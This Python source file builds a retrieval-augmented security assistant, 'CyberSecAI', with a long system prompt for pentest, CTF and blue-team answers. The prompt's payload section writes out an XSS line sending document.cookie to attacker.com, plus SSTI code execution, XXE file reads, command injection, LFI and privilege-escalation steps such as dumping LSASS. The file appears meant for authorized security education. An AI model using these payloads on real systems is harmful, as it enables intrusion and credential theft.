"""
CyberSecAI — Elite Ethical Hacking & Cybersecurity RAG Pipeline

v5.0 — Parallel Dual-Source Fusion Engine

Architecture:
  RAG (Qdrant) + DuckDuckGo Web Search run CONCURRENTLY every single request.
  Results are ALWAYS combined into one synthesized answer:
    - RAG documents  → [AUTHORITATIVE] primary grounding
    - Live web intel → [LIVE-WEB] CVEs, PoCs, tool updates, latest techniques
  This replaces the old sequential fallback model.

Pipeline flow:
  1.  Enrich query with conversation context + cybersec acronym awareness
  2.  Embed query locally (BGE-base ONNX, LRU-256 cached)
  3a. Hybrid RAG search: BGE vector + BM25 + RRF → top 30 candidates  [THREAD A]
  3b. DuckDuckGo web search with cybersec site filters                  [THREAD B]
  4.  Rerank RAG candidates with cross-encoder → top 8
  5.  Layer 1 + Layer 2 guardrail check (loosened for technical content)
  6.  Build FUSED prompt: RAG chunks (primary) + Web results (enrichment)
  7.  Call Groq LLM (temperature=0.05 for precision)
  8.  Layer 3 — detect INSUFFICIENT_DOCUMENT_COVERAGE sentinel
  9.  Return synthesized answer + rag_sources + web_sources + timing

System persona: senior penetration tester + vulnerability researcher +
security architect — covering web/API/network/cloud/AD/IoT/mobile pentest,
binary exploitation, reversing, malware analysis, forensics, blue-team,
crypto, OSINT, CTF, bug bounty.
"""
import os
import time
import concurrent.futures
from datetime import datetime
from dotenv import load_dotenv
from src.embedder import get_embedding
from src.hybrid_search import hybrid_search
from src.reranker import rerank
from src.web_search import perform_web_search, format_web_context

load_dotenv()

# ─── LLM config ──────────────────────────────────────────────────────────────
GROQ_API_KEY    = os.getenv("GROQ_API_KEY", "")
GROQ_MODEL      = os.getenv("GROQ_MODEL", "llama-3.3-70b-versatile")
RERANKER_TOP_K  = int(os.getenv("RERANKER_TOP_K", "8"))
LLM_TEMPERATURE = 0.05   # Low temperature = sharp, reproducible technical answers

# ─── Web Search Config ────────────────────────────────────────────────────────
# WEB_ALWAYS_ON: if True, web search runs on EVERY query (parallel with RAG)
# If False, web search only runs when RAG guardrails fail (legacy fallback mode)
WEB_ALWAYS_ON       = os.getenv("WEB_ALWAYS_ON", "true").lower() == "true"
ENABLE_WEB_FALLBACK = os.getenv("ENABLE_WEB_FALLBACK", "true").lower() == "true"
MAX_WEB_RESULTS     = int(os.getenv("MAX_WEB_RESULTS", "6"))

# ─── Guardrail thresholds (loosened for technical cybersec content) ───────────
RELEVANCE_THRESHOLD = float(os.getenv("RELEVANCE_THRESHOLD", "-3.5"))
MIN_RELEVANT_CHUNKS = int(os.getenv("MIN_RELEVANT_CHUNKS", "1"))

# ─── Thread pool (kept warm for fast parallel execution) ──────────────────────
_executor = concurrent.futures.ThreadPoolExecutor(max_workers=4, thread_name_prefix="cybersec-worker")

# ─── Refusal message ──────────────────────────────────────────────────────────
REFUSAL_MSG = (
    "I don't have sufficient coverage to answer that well. CyberSecAI specialises in "
    "ethical hacking and security topics — penetration testing, CVEs, exploit development, "
    "CTF challenges, bug bounty, malware analysis, forensics, and blue-team defence. "
    "Try rephrasing your question, or upload a relevant resource (PDF/DOCX/TXT) and ask again."
)

# ─── Answer styles ────────────────────────────────────────────────────────────
ANSWER_STYLES = {
    "short": {
        "instruction": (
            "Deliver a tight, direct answer — 1-3 sentences or a single focused code block. "
            "Lead with the answer (command/payload/syntax), then one line of why. "
            "Use **bold** for the key term and a correctly tagged fenced block for any code. "
            "No preamble, no section headers, no filler."
        ),
        "max_tokens": 400,
    },
    "technical": {
        "instruction": (
            "Produce a precise, expert technical response in clean Markdown:\n"
            "- `## Title` heading that names the technique/CVE/tool.\n"
            "- One-paragraph concept/vulnerability-class explanation.\n"
            "- Working code in every requested language, each in a correctly tagged fenced block "
            "(```python, ```bash, ```c, ```javascript, ```powershell, ```ruby, ```nasm, ```sql, …).\n"
            "- Reference CVE IDs, MITRE ATT&CK technique IDs (TxxXX), and exact tool flags inline.\n"
            "- `### Mitigation` subsection with the matching patch/config/detection rule.\n"
            "Cite `[Doc: source]` for RAG document facts; cite `[Web: title](url)` for live web facts."
        ),
        "max_tokens": 3500,
    },
    "detailed": {
        "instruction": (
            "Produce an exhaustive, expertly structured analysis in Markdown following PTES/Cyber Kill Chain:\n"
            "- `## Title` + a 2-3 sentence executive summary.\n"
            "- `### Background` — affected systems/versions, CVE/CVSS context, why it matters.\n"
            "- `### Reconnaissance & Enumeration` — phase-specific tooling and exact commands.\n"
            "- `### Vulnerability Analysis` — root cause and trigger conditions.\n"
            "- `### Exploitation` — step-by-step, runnable code in the relevant languages.\n"
            "- `### Post-Exploitation` (if applicable) — persistence/priv-esc/lateral movement.\n"
            "- `### Tools` — table of tools with purpose and key flags.\n"
            "- `### Detection & Defense` — patches, hardening, WAF/EDR/SIEM rules.\n"
            "- `### MITRE ATT&CK Mapping` — relevant Tactic/Technique IDs.\n"
            "- `## Key Takeaways` — 3-5 concise bullets.\n"
            "Use Markdown tables to compare payloads, CVE variants, or technique trade-offs. "
            "Cite `[Doc: source]` for RAG facts; `[Web: title](url)` for live web facts."
        ),
        "max_tokens": 5000,
    },
    "ctf": {
        "instruction": (
            "Structure the response as a CTF challenge walkthrough in Markdown:\n"
            "- `## Challenge Analysis` — identify the likely category and vulnerability class.\n"
            "- `### Progressive Hints` — 3 hints ordered spoiler-light → spoiler-heavy.\n"
            "- `### Approach` — methodology and the specific tools to reach the solution.\n"
            "- `### Exploit / Payload` — a clean, commented working exploit in tagged fenced blocks "
            "(```python, ```bash, etc.), runnable against a typical challenge instance.\n"
            "- `### Flag Location & Format` — expected flag format and where it is typically found.\n"
            "- `### Concepts Learned` — the transferable lesson (e.g. format-string, SSTI, ret2win)."
        ),
        "max_tokens": 3000,
    },
}

DEFAULT_STYLE     = "technical"
GLOBAL_MAX_TOKENS = 5000


# ─── Guardrail functions ──────────────────────────────────────────────────────

def filter_chunks_by_threshold(chunks: list[dict]) -> list[dict]:
    """Layer 2: Remove chunks whose rerank score is below RELEVANCE_THRESHOLD."""
    return [c for c in chunks if c.get("rerank_score", -99.0) >= RELEVANCE_THRESHOLD]


def check_guardrails(reranked: list[dict]) -> tuple[bool, str]:
    """Run Layer 1 and Layer 2 checks. Returns (should_refuse, reason)."""
    top_score = reranked[0].get("rerank_score", -99.0) if reranked else -99.0
    print(f"  [Guardrail L1] Top rerank score: {top_score:.4f} (threshold: {RELEVANCE_THRESHOLD})")

    if top_score < RELEVANCE_THRESHOLD:
        return True, f"Top chunk score {top_score:.4f} below threshold {RELEVANCE_THRESHOLD}"

    passing = filter_chunks_by_threshold(reranked)
    print(f"  [Guardrail L2] {len(passing)}/{len(reranked)} chunks passed (min: {MIN_RELEVANT_CHUNKS})")

    if len(passing) < MIN_RELEVANT_CHUNKS:
        return True, f"Only {len(passing)} chunk(s) passed relevance threshold (need {MIN_RELEVANT_CHUNKS})"

    return False, ""


# ─── Query enrichment ─────────────────────────────────────────────────────────

def enrich_query(question: str, history: list[dict] = None) -> str:
    """
    Enrich the search query with conversation context for follow-up awareness.
    Short follow-ups (≤ 10 words) get the last assistant turn prepended.
    """
    if not history:
        return question

    last_assistant = None
    for msg in reversed(history):
        if msg.get("role") == "assistant":
            last_assistant = msg.get("text", "")
            break

    if not last_assistant or len(last_assistant) < 10:
        return question

    if len(question.split()) <= 10:
        context_snippet = last_assistant[:200].replace("\n", " ").strip()
        enriched = f"{context_snippet} {question}"
        print(f"  [Memory] Context-enriched query for follow-up")
        return enriched

    return question


# ─── Prompt builders ──────────────────────────────────────────────────────────

def _build_system_prompt(answer_style: str, now_str: str, current_year: int) -> str:
    """
    Build the elite CyberSecAI system persona block used in all prompts.
    Includes domain mastery, operating principles, CTF/BB heuristics,
    privesc checklists, and formatting rules.
    """
    style = ANSWER_STYLES.get(answer_style, ANSWER_STYLES[DEFAULT_STYLE])

    return f"""<system_instructions>
You are **CyberSecAI** — an elite Ethical Hacking & Cybersecurity Intelligence System. You reason like a senior penetration tester, vulnerability researcher, red team operator, and security architect combined. You assist defenders, red teamers, CTF players, bug-bounty hunters, and security researchers working within authorized scope.

<temporal_anchor>
Current System Date & Time: {now_str}
Current Year: {current_year}
When the user asks for today's date, current time, or real-time temporal information, state the exact date/time directly from this temporal anchor.
</temporal_anchor>

<domain_mastery>
You command the full offensive and defensive security spectrum:
- **Web & API**: OWASP Top 10, business logic flaws, authentication bypass, IDOR, JWT attacks, GraphQL injection, OAuth misconfigs, CORS abuse, HTTP desync/smuggling.
- **Network**: port scanning, service fingerprinting, firewall evasion, VLAN hopping, ARP/DNS poisoning, MITM, protocol fuzzing, VPN/IPSec attacks.
- **Active Directory**: Kerberoasting, AS-REP roasting, Pass-the-Hash, Pass-the-Ticket, DCSync, Golden/Silver tickets, BloodHound path analysis, LDAP enumeration, ACL abuse, printer bug, coercion attacks (PetitPotam, PrintNightmare).
- **Cloud**: AWS (IAM privilege escalation, S3 enumeration, SSRF→IMDS, Lambda abuse), Azure (AAD, managed identity abuse, storage SAS), GCP (GKE, service account key theft), container escape, Kubernetes RBAC abuse.
- **Binary Exploitation**: stack/heap overflows, ROP chains, ret2libc/ret2plt, format strings, use-after-free, heap feng shui, ASLR/NX/PIE bypass, kernel exploitation basics.
- **Reverse Engineering**: static analysis (Ghidra/IDA), dynamic analysis (GDB/pwndbg/x64dbg), anti-debug bypasses, packed malware unpacking, firmware analysis (binwalk/QEMU), frida instrumentation.
- **Mobile**: Android APK decompilation (jadx/apktool), activity/intent hijacking, insecure data storage, certificate pinning bypass (frida/objection), iOS jailbreak detection bypass.
- **Wireless**: WPA2 handshake capture/crack, PMKID attack, Evil Twin, deauth, Bluetooth BLE enumeration, RFID/NFC cloning.
- **IoT/Embedded**: UART/JTAG debugging, firmware extraction, hardcoded credentials, MQTT/CoAP enumeration.
- **Malware & Forensics**: YARA rules, memory forensics (Volatility), disk forensics, log analysis, timeline reconstruction, C2 beacon analysis, anti-forensics awareness.
- **Red Team OPSEC**: C2 infrastructure (Cobalt Strike/Sliver/Havoc profiles), malleable C2, domain fronting, living-off-the-land (LOLBins/LOLBas), timestomping, log evasion, EDR bypass techniques.
- **Blue Team / Threat Hunting**: SIEM correlation rules, Sigma/Suricata/YARA rule writing, anomaly detection, threat intelligence, IOC extraction, MITRE D3FEND.
- **Cryptography**: block cipher attacks (ECB, padding oracle), RSA (small e, common modulus, Wiener's), ECC attacks, hash cracking, rainbow tables, TLS misconfigs.
- **OSINT**: domain/IP recon (Shodan/Censys/Amass), Google dorks, social engineering pre-text, credential leak hunting (HIBP, Dehashed), dark web indicators.
- **Frameworks**: PTES, OWASP Testing Guide, MITRE ATT&CK (Enterprise/Mobile/ICS) with Tactic TAxx / Technique Txx.xxx, Cyber Kill Chain, NIST CSF, CVSS v3.1/v4.0, STRIDE, DREAD.
- **Tooling**: nmap/masscan/naabu, Burp Suite Pro, sqlmap, ffuf/gobuster/feroxbuster, Metasploit/msfvenom, BloodHound/SharpHound, Impacket suite, CrackMapExec/NetExec, Evil-WinRM, Kerbrute, Wireshark/tshark, Ghidra/IDA Free, gdb/pwndbg/pwntools, hashcat/john, aircrack-ng, frida/objection, Volatility3, theHarvester/Amass/subfinder, nuclei, Nessus/OpenVAS, Cobalt Strike/Sliver/Havoc (concepts).
</domain_mastery>

<operating_principles>
1. **ANSWER FIRST — BE DECISIVE.** Default to a complete, correct, useful answer. Refuse ONLY for the narrow reasons in <refusal_lines>. Never hedge when you know the answer.

2. **RAG DOCUMENTS ARE AUTHORITATIVE.** When <rag_documents> covers the question, ground your answer in it. Cite inline as `[Doc: source]` for any specific fact, technique, or figure drawn from a document.

3. **LIVE WEB INTEL IS ENRICHMENT.** <live_web_intel> provides the latest CVE details, PoC links, tool versions, and recent techniques. Synthesize it with RAG facts to produce the most current, complete answer possible. Cite web sources as `[Web: Title](url)`.

4. **EXPERT-KNOWLEDGE FALLBACK.** When both RAG and web are silent or sparse on a topic, answer from expertise. Standard security knowledge — tool flags, CVE mechanics, OWASP techniques, common payloads — is professional knowledge: supply it freely and accurately.

5. **CITATION DISCIPLINE.** Cite RAG for document-derived facts (`[Doc: source]`). Cite web for live intel (`[Web: Title](url)`). No citation needed for general professional knowledge. A correct expert answer with no citations beats a fabricated one.

6. **TECHNICAL DEPTH & PRECISION.** Be concrete and reproducible: exact flags, exact payload structure, exact version constraints. State assumptions (target OS, app version, privilege context) explicitly. Show minimal viable payload, then hardening/evasion variants.

7. **MULTI-LANGUAGE CODE GENERATION.** Generate complete, runnable, well-commented code in the requested language:
   - Python → ```python```  •  Bash/Shell → ```bash```  •  C/C++ → ```c```/```cpp```
   - JavaScript/Node.js → ```javascript```  •  PowerShell → ```powershell```  •  Ruby → ```ruby```
   - SQL → ```sql```  •  Assembly x86/x64 → ```nasm```  •  Go → ```go```  •  Rust → ```rust```
   Add comments per logical block and a short usage example. Warn clearly before any destructive operation.

8. **COVERAGE SIGNAL (rare).** Emit `INSUFFICIENT_DOCUMENT_COVERAGE` on a line by itself ONLY when the question is clearly outside cybersecurity AND neither RAG nor web has useful coverage. For in-scope under-documented questions, fall back to expertise — do NOT emit this signal.

9. **ZERO META-TALK.** Never say "according to the documents," "based on the context," "the web results show," or "I cannot browse." Present knowledge directly as an expert. Cite via tags, not narration.
</operating_principles>

<cybersec_excellence>
When answering exploitation or pentest questions, apply these heuristics automatically:

**Bug Bounty Methodology:**
Recon (passive/active) → Technology fingerprinting → Attack surface mapping →
Automated fuzzing (ffuf/nuclei) → Manual validation → Exploit PoC → Impact assessment → Report

**Privilege Escalation — Linux checklist:**
sudo -l → SUID/SGID binaries (find / -perm /4000) → writable cron jobs → PATH hijacking →
capabilities (getcap -r /) → writable /etc/passwd or /etc/shadow → NFS no_root_squash →
Docker/LXD group → kernel version exploits (uname -r → searchsploit) → writable service files

**Privilege Escalation — Windows checklist:**
whoami /priv (SeImpersonatePrivilege → Potato attacks) → AlwaysInstallElevated →
unquoted service paths → weak service permissions (sc qc / accesschk) →
scheduled tasks → stored credentials (cmdkey /list, registry, SAM dump) →
token impersonation → UAC bypass → DLL hijacking → LSASS dump (mimikatz/pypykatz)

**Common Payload Archetypes (for authorized testing):**
- SQLi: `' OR 1=1--`, `' UNION SELECT NULL,@@version--`, blind: `' AND SLEEP(5)--`
- XSS: `<script>fetch('https://attacker.com/'+document.cookie)</script>`
- SSTI (Jinja2): `{{7*7}}` → `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- SSRF: `http://169.254.169.254/latest/meta-data/` (AWS IMDS)
- XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
- Command injection: `; id`, `| whoami`, `` `id` ``, `$(id)`
- LFI: `../../../etc/passwd`, PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`

**CTF Heuristics:**
- Web → inspect source, headers, robots.txt, cookies, JS files, API endpoints
- Crypto → identify cipher from ciphertext structure; check for weak key/IV reuse
- Pwn → checksec first; identify vulnerability class; find gadgets (ROPgadget/ropper)
- Reversing → strings, ltrace/strace, decompile with Ghidra, identify key comparison logic
- Forensics → file magic bytes, binwalk, steghide/zsteg, volatility, pcap analysis

**MITRE ATT&CK Integration:** Tag every offensive technique with its Tactic (TAxx) and Technique (Txx.xxx) where applicable. Always mirror with the corresponding defensive detection/mitigation.
</cybersec_excellence>

<authorized_scope>
Offensive techniques are provided within authorized contexts only: formal penetration tests with documented scope/authorization, CTF/lab platforms (HTB, THM, PicoCTF, etc.), bug-bounty programs under their disclosed policy, defensive security research, malware analysis in isolated lab environments, and security education. All targets, IPs, domains, and credentials in examples are lab/placeholder values unless the user provides explicit, credible authorization.
</authorized_scope>

<refusal_lines>
DECLINE OR PIVOT — and explain why — for requests that:
- Target specific real-world systems, individuals, or organizations without credible authorization.
- Build malware, ransomware, or offensive tooling whose primary purpose is real-world harm, theft, or mass exploitation.
- Facilitate unauthorized access, account takeover, or credential theft against third parties.
- Aid doxxing, harassment, or attacks on critical infrastructure.
For genuinely ambiguous cases: provide the authorized test-lab version plus detection and defensive remediation, and note what authorization would be required.
</refusal_lines>

<methodology>
For offensive/attack questions, map answers to recognized phases:
Reconnaissance → Enumeration/Scanning → Vulnerability Analysis → Exploitation →
Post-Exploitation/Persistence → (Lateral Movement) → Reporting.
Tag each technique with MITRE ATT&CK Tactic/Technique (e.g. T1190 Exploit Public-Facing Application).
Always pair offensive content with the matching detection signature and defensive mitigation.
</methodology>

<formatting_rules>
- Lead with `## Title` (H2); use `### Section` (H3) and `#### Sub` sparingly.
- **Bold** for critical terms, CVE IDs, MITRE IDs, tool names; `inline code` for flags, paths, IPs, hashes, keys, function names.
- Wrap ALL code in fenced blocks with the correct language tag; keep examples version-aware and runnable.
- Markdown tables to compare payloads, CVEs, technique variants, or tool trade-offs.
- Blockquotes (`>`) for callouts: warnings, scope reminders, defensive notes.
- Keep prose tight and skimmable; let structure and code carry depth.
</formatting_rules>

<target_depth_style>
{style['instruction']}
</target_depth_style>
</system_instructions>"""


def build_prompt(
    question:       str,
    context_chunks: list[dict],
    history:        list[dict] = None,
    answer_style:   str = None,
) -> str:
    """
    Build a RAG-only prompt (legacy/fallback).
    Used when web search is disabled or produced no results.
    """
    if answer_style not in ANSWER_STYLES:
        answer_style = DEFAULT_STYLE

    context_blocks = []
    for i, chunk in enumerate(context_chunks):
        source_name  = chunk.get("source",       f"Document {i+1}")
        text_content = chunk.get("text",         "").strip()
        content_type = chunk.get("content_type", "general")
        cves         = chunk.get("cves",         [])
        section      = chunk.get("section",      "")

        meta_attrs = f'index="{i+1}" source="{source_name}" type="{content_type}"'
        if cves:
            meta_attrs += f' cves="{",".join(cves)}"'
        if section:
            meta_attrs += f' section="{section[:80]}"'

        context_blocks.append(f'<document {meta_attrs}>\n{text_content}\n</document>')

    context_text = "\n\n".join(context_blocks)

    history_xml = _build_history_xml(history)
    now_str      = datetime.now().strftime("%Y-%m-%d %H:%M:%S (%A)")
    current_year = datetime.now().year

    sys_prompt = _build_system_prompt(answer_style, now_str, current_year)

    return f"""{sys_prompt}

{history_xml}<rag_documents>
{context_text}
</rag_documents>

<user_query>
{question}
</user_query>

<response>"""


def build_fused_prompt(
    question:       str,
    context_chunks: list[dict],
    web_results:    list[dict],
    history:        list[dict] = None,
    answer_style:   str = None,
) -> str:
    """
    Build the FUSED prompt combining RAG documents (authoritative) with
    live web intelligence (enrichment) into one synthesized context.

    The LLM is instructed to:
    1. Treat RAG chunks as the primary, authoritative source
    2. Enrich with latest CVE details, PoC links, tool versions from web
    3. Cite both sources distinctly: [Doc: source] and [Web: Title](url)
    """
    if answer_style not in ANSWER_STYLES:
        answer_style = DEFAULT_STYLE

    # ── RAG context ──────────────────────────────────────────────────────────
    context_blocks = []
    for i, chunk in enumerate(context_chunks):
        source_name  = chunk.get("source",       f"Document {i+1}")
        text_content = chunk.get("text",         "").strip()
        content_type = chunk.get("content_type", "general")
        cves         = chunk.get("cves",         [])
        section      = chunk.get("section",      "")

        meta_attrs = f'index="{i+1}" source="{source_name}" type="{content_type}"'
        if cves:
            meta_attrs += f' cves="{",".join(cves)}"'
        if section:
            meta_attrs += f' section="{section[:80]}"'

        context_blocks.append(f'<document {meta_attrs}>\n{text_content}\n</document>')

    rag_context = "\n\n".join(context_blocks) if context_blocks else "<document>No local documents indexed yet.</document>"

    # ── Web context ──────────────────────────────────────────────────────────
    web_context = format_web_context(web_results) if web_results else "<web_source>No live web results available.</web_source>"

    history_xml  = _build_history_xml(history)
    now_str      = datetime.now().strftime("%Y-%m-%d %H:%M:%S (%A)")
    current_year = datetime.now().year

    sys_prompt = _build_system_prompt(answer_style, now_str, current_year)

    rag_label = f"[AUTHORITATIVE — {len(context_chunks)} chunks from your indexed documents]" if context_blocks else "[No local documents — using expert knowledge + web]"
    web_label = f"[LIVE-WEB — {len(web_results)} fresh results from DuckDuckGo]" if web_results else "[No live web results]"

    return f"""{sys_prompt}

{history_xml}<rag_documents label="{rag_label}">
{rag_context}
</rag_documents>

<live_web_intel label="{web_label}">
{web_context}
</live_web_intel>

<fusion_directive>
Synthesize BOTH sources above into one expert answer:
- Use <rag_documents> as your PRIMARY source of truth for technical facts, tool details, and established techniques.
- Use <live_web_intel> to ENRICH with the latest CVE scores, PoC links, updated tool versions, recent technique variants, and current threat intelligence.
- Do NOT present two separate answers. Blend both into a single, cohesive, extraordinary response.
- Cite inline: [Doc: source_name] for RAG facts, [Web: Title](url) for web facts.
- When RAG and web conflict on a fact, prefer the more specific/recent source and note the discrepancy if significant.
</fusion_directive>

<user_query>
{question}
</user_query>

<response>"""


def build_web_prompt(
    question:     str,
    web_results:  list[dict],
    history:      list[dict] = None,
    answer_style: str = None,
) -> str:
    """
    Build a web-only prompt (used when RAG has zero chunks).
    Kept for backward compatibility with legacy /query endpoint.
    """
    if answer_style not in ANSWER_STYLES:
        answer_style = DEFAULT_STYLE

    style       = ANSWER_STYLES[answer_style]
    web_text    = format_web_context(web_results)
    history_xml = _build_history_xml(history)
    now_str      = datetime.now().strftime("%Y-%m-%d %H:%M:%S (%A)")
    current_year = datetime.now().year

    sys_prompt = _build_system_prompt(answer_style, now_str, current_year)

    return f"""{sys_prompt}

{history_xml}<live_web_intel>
{web_text}
</live_web_intel>

<fusion_directive>
Synthesize the live web intel above into a direct expert answer. Cite web sources inline as [Web: Title](url).
</fusion_directive>

<user_query>
{question}
</user_query>

<response>"""


def _build_history_xml(history: list[dict]) -> str:
    """Build conversation history XML block."""
    if not history:
        return ""
    recent = history[-6:]
    turns  = []
    for msg in recent:
        role = "user" if msg.get("role") == "user" else "assistant"
        text = (msg.get("text") or "").strip()[:400]
        turns.append(f'  <{role}>{text}</{role}>')
    if not turns:
        return ""
    return "<conversation_history>\n" + "\n".join(turns) + "\n</conversation_history>\n\n"


# ─── LLM call ─────────────────────────────────────────────────────────────────

def call_groq(prompt: str, max_tokens: int = 1024, max_retries: int = 3) -> str:
    """Call Groq API with retry logic for rate limits."""
    from groq import Groq

    client = Groq(api_key=GROQ_API_KEY)

    for attempt in range(max_retries):
        try:
            chat = client.chat.completions.create(
                model=GROQ_MODEL,
                messages=[{"role": "user", "content": prompt}],
                temperature=LLM_TEMPERATURE,
                max_tokens=max_tokens,
            )
            return chat.choices[0].message.content.strip()
        except Exception as e:
            error_msg = str(e)
            if "rate_limit" in error_msg.lower() and attempt < max_retries - 1:
                wait = (attempt + 1) * 2
                print(f"  Rate limited, retrying in {wait}s...")
                time.sleep(wait)
                continue
            raise

    raise Exception("Groq API failed after retries")


def detect_off_document_answer(text: str) -> bool:
    """Layer 3: Detect if the LLM flagged insufficient coverage."""
    return "INSUFFICIENT_DOCUMENT_COVERAGE" in text.upper()


# ─── Main pipeline ────────────────────────────────────────────────────────────

def answer(
    question:     str,
    top_k:        int = None,
    history:      list[dict] = None,
    answer_style: str = None,
) -> dict:
    """
    CyberSecAI v5.0 — Parallel Dual-Source Fusion Pipeline.

    Runs RAG search and Web search CONCURRENTLY, then synthesizes both
    into a single expert answer via the fused prompt.

    Args:
        question:     User's cybersecurity question
        top_k:        Number of RAG chunks to pass to LLM (default: RERANKER_TOP_K)
        history:      Previous conversation turns [{role, text}, ...]
        answer_style: "short" | "technical" | "detailed" | "ctf"
    """
    if top_k is None:
        top_k = RERANKER_TOP_K
    if answer_style not in ANSWER_STYLES:
        answer_style = DEFAULT_STYLE

    style   = ANSWER_STYLES[answer_style]
    t_start = time.time()

    # ── Step 1: Enrich query ──────────────────────────────────────────────────
    search_query = enrich_query(question, history)

    # ── Step 2: Embed query (BGE-base, cached) ────────────────────────────────
    t1 = time.time()
    query_vector = get_embedding(search_query, is_query=True)
    t_embed = time.time() - t1

    # ── Step 3: PARALLEL — RAG search + Web search ────────────────────────────
    t2 = time.time()

    # Submit both searches to the thread pool simultaneously
    rag_future = _executor.submit(hybrid_search, query_vector, search_query)
    web_future = _executor.submit(
        perform_web_search, search_query, MAX_WEB_RESULTS
    ) if WEB_ALWAYS_ON else None

    # Wait for RAG results
    candidates = rag_future.result()
    t_search   = time.time() - t2

    # ── Step 4: Rerank RAG candidates ────────────────────────────────────────
    t3 = time.time()
    reranked = rerank(question, candidates, top_k=top_k) if candidates else []
    t_rerank = time.time() - t3

    # ── Collect web results (usually already done while reranking) ────────────
    t_web_start  = time.time()
    web_results  = web_future.result() if web_future else []
    t_web        = time.time() - t_web_start
    print(f"  [Web Search] {len(web_results)} results (wait: {round(t_web*1000)}ms)")

    # ── Step 5: Guardrails ────────────────────────────────────────────────────
    if candidates:
        should_refuse, refuse_reason = check_guardrails(reranked)
    else:
        should_refuse  = True
        refuse_reason  = "No RAG candidates returned"

    if should_refuse:
        print(f"  [Guardrail] RAG blocked: {refuse_reason}")
        # RAG failed → use web results as primary (if available)
        if web_results:
            print("  [Fusion] RAG insufficient — web-primary fused answer")
            prompt      = build_fused_prompt(question, [], web_results, history=history, answer_style=answer_style)
            t4          = time.time()
            answer_text = call_groq(prompt, max_tokens=style["max_tokens"])
            t_llm       = time.time() - t4

            web_sources = [r["url"] for r in web_results if r.get("url")]
            web_titles  = [r["title"] for r in web_results if r.get("title")]

            return {
                "answer":          answer_text,
                "sources":         web_titles[:3],
                "web_sources":     web_sources,
                "is_web_fallback": True,
                "refused":         False,
                "provider":        "groq",
                "model":           GROQ_MODEL,
                "answer_style":    answer_style,
                "timing": {
                    "embed_ms":      round(t_embed * 1000),
                    "search_ms":     round(t_search * 1000),
                    "rerank_ms":     round(t_rerank * 1000),
                    "web_search_ms": round(t_web * 1000),
                    "llm_ms":        round(t_llm * 1000),
                    "total_ms":      round((time.time() - t_start) * 1000),
                }
            }

        return {
            "answer":          REFUSAL_MSG,
            "sources":         [],
            "web_sources":     [],
            "is_web_fallback": False,
            "refused":         True,
            "refuse_reason":   refuse_reason,
            "timing": {
                "embed_ms":  round(t_embed * 1000),
                "search_ms": round(t_search * 1000),
                "rerank_ms": round(t_rerank * 1000),
                "total_ms":  round((time.time() - t_start) * 1000),
            }
        }

    passing_chunks = filter_chunks_by_threshold(reranked)
    print(f"  [Pipeline] {len(passing_chunks)} RAG chunks + {len(web_results)} web results → Fused LLM (style={answer_style})")

    if not GROQ_API_KEY or GROQ_API_KEY == "your_groq_api_key_here":
        raise Exception("GROQ_API_KEY not set in .env")

    # ── Step 6: Build FUSED prompt ────────────────────────────────────────────
    t4     = time.time()
    prompt = build_fused_prompt(
        question,
        passing_chunks,
        web_results,
        history=history,
        answer_style=answer_style,
    )

    # ── Step 7: Call Groq ─────────────────────────────────────────────────────
    answer_text = call_groq(prompt, max_tokens=style["max_tokens"])
    t_llm       = time.time() - t4

    # ── Step 8: Layer 3 — off-document detection ──────────────────────────────
    if detect_off_document_answer(answer_text):
        print("  [Guardrail L3] INSUFFICIENT_DOCUMENT_COVERAGE detected")
        if web_results:
            # Retry with web-primary fused prompt
            print("  [Fusion] Retrying with web-primary fused answer")
            prompt2     = build_fused_prompt(question, [], web_results, history=history, answer_style=answer_style)
            t4b         = time.time()
            answer_text = call_groq(prompt2, max_tokens=style["max_tokens"])
            t_llm       = time.time() - t4b

            web_sources = [r["url"] for r in web_results if r.get("url")]
            web_titles  = [r["title"] for r in web_results if r.get("title")]

            return {
                "answer":          answer_text,
                "sources":         web_titles[:3],
                "web_sources":     web_sources,
                "is_web_fallback": True,
                "refused":         False,
                "provider":        "groq",
                "model":           GROQ_MODEL,
                "answer_style":    answer_style,
                "timing": {
                    "embed_ms":      round(t_embed * 1000),
                    "search_ms":     round(t_search * 1000),
                    "rerank_ms":     round(t_rerank * 1000),
                    "web_search_ms": round(t_web * 1000),
                    "llm_ms":        round(t_llm * 1000),
                    "total_ms":      round((time.time() - t_start) * 1000),
                }
            }

        return {
            "answer":          REFUSAL_MSG,
            "sources":         [],
            "web_sources":     [],
            "is_web_fallback": False,
            "refused":         True,
            "refuse_reason":   "LLM determined documents do not cover this question",
            "timing": {
                "embed_ms":  round(t_embed * 1000),
                "search_ms": round(t_search * 1000),
                "rerank_ms": round(t_rerank * 1000),
                "llm_ms":    round(t_llm * 1000),
                "total_ms":  round((time.time() - t_start) * 1000),
            }
        }

    # ── Step 9: Return fused answer ───────────────────────────────────────────
    unique_rag_sources = list({c["source"] for c in passing_chunks})
    web_sources        = [r["url"] for r in web_results if r.get("url")]
    t_total            = time.time() - t_start

    print(f"  [CyberSecAI v5] Fused answer ready. RAG: {unique_rag_sources} | Web: {len(web_results)} results")
    print(f"  [Timing] embed={round(t_embed*1000)}ms rag_search={round(t_search*1000)}ms "
          f"rerank={round(t_rerank*1000)}ms web={round(t_web*1000)}ms "
          f"llm={round(t_llm*1000)}ms total={round(t_total*1000)}ms")

    return {
        "answer":          answer_text,
        "sources":         unique_rag_sources,
        "web_sources":     web_sources,
        "is_web_fallback": False,
        "refused":         False,
        "provider":        "groq",
        "model":           GROQ_MODEL,
        "answer_style":    answer_style,
        "chunks_used":     passing_chunks,
        "timing": {
            "embed_ms":      round(t_embed * 1000),
            "search_ms":     round(t_search * 1000),
            "rerank_ms":     round(t_rerank * 1000),
            "web_search_ms": round(t_web * 1000),
            "llm_ms":        round(t_llm * 1000),
            "total_ms":      round(t_total * 1000),
        }
    }
